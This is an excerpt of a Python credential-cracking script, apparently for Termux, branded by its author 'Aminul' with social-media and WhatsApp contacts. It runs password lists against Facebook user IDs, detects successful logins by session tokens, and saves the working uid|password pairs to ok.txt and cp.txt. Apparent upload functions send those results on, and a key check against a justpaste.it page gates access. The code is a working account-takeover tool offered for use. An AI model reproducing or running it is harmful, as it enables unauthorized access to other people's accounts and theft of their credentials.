...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/AMINUL/approval.txt/blob/main/Ap.txt"])
	exit(" [*] FACEBOOK :  Md Aminul Islam")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGERðŸ”°AMINUL")
	subprocess.check_output(["am", "start", "https://m.me/mr.Aminul6"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://justpaste.it/96aom').text
			if basesplit in plr:
				key = basesplit
  ...
  __  __ ____       _    __  __ ___ _   _ _   _ _     
 |  \/  |  _ \     / \  |  \/  |_ _| \ | | | | | |    
 | |\/| | |_) |   / _ \ | |\/| || ||  \| | | | | |    
 | |  | |  _ < _ / ___ \| |  | || || |\  | |_| | |___ 
 |_|  |_|_| \_(_)_/   \_\_|  |_|___|_| \_|\___/|_____|
                                                                                     
\033[1;90mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
\033[1;91m [\033[1;94mâœ“\033[1;91m] \033[1;92mFACEBOOK : Md Aminul Islam
\033[1;91m [\033[1;94mâœ“\033[1;91m] \033[1;92mFB GROUP : MR. CYBER TEAM 
\033[1;91m [\033[1;94mâœ“\033[1;91m] \033[1;92mGITHUB   : mr.Aminul
\033[1;91m [\033[1;94mâœ“\033[1;91m] \033[1;92mWhatsapp  : 01879594529
\033[1;90mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: AMINUL): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [AMINUL_OLD] : %s/%s -> \033[0;92m [ AMINUL-OK:%s ]- \033[0;91m[AMINUL-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[AMINUL-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [AMINUL-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[AMINUL-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [AMINUL-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
